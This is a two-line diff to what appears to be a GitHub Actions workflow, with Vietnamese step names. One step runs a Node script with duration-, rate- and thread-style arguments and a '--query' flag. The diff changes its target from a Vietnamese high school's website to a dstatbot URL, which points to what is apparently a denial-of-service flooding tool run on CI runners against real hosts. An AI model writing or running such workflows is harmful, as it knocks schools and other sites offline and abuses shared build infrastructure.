@@ -29,4 +29,4 @@ jobs:
 
       # Chạy file với hệ số
       - name: Chạy Tool
-        run: node y.js http://thptcamnhan.edu.vn/ 300 50 800 --query
+        run: node yv2.js https://c2.dstatbot.win/I2AKSRSx 300 50 800 --query
